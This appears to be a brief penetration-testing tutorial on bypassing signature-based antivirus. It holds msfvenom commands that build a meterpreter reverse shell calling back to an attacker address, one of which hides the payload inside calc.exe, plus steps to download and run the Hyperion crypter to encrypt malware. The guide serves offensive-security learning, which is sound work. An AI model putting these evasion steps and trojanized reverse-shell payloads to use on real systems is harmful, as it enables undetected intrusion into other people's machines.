# Bypassing antivirus

So first of all, what is a antivirus program and how does it work?

## How does it work?

Antivirus normally uses blacklisting as their methodology. They have a huge database full of signatures for different known malware. Then the antivirus just scans the disk and search for any of those signatures. 

## How do we bypass it?

So since there are many different antivirus and they all have different databases of signatures it is important for us to know what antivirus our target uses. Once we know that we can use virtustotal.com to upload our malicious files to see if that specific antivirus finds it. 

So what we need to do is to change the malware enough so that the signature changes and the antivirus is not able to identify the file as malicious.

There are a few different techniques for doing this.

### Encoding

We can encode our malware in different ways. This can be done with msfvenom. Notice how we set the `-e` flag here, and then use the `shikata_ga_nai` encoding. This is not that effective since antivirus-vendors have access to metasploit as well.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -o meterpreter_encoded.exe
```

### Embed in non-malicious file

Another way is to embed our payload in a non-malicious file.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -x calc.exe -o
bad_calc.exe
```

### Encrypting the malware

In order to obfuscate our malware we can encrypt it, and thus radically changing the signature. One much mentioned tool for doing that is Hyperion. It is a windows binary but we can compile and run it from linux as well. This worked for me (october 2016)

```
wget https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
unzip Hyperion-1.2.zip
i686-w64-mingw32-c++ Hyperion-1.2/Src/Crypter/*.cpp -o hyperion.exe
```

In Kali you have hyperion 1 included. However for it to work you have to run it from it's correct path. So go to `/usr/share/veil-evasion/tools/hyperion`

And run it like this

```
wine hyperion /path/to/file.exe encryptedfile.exe
```
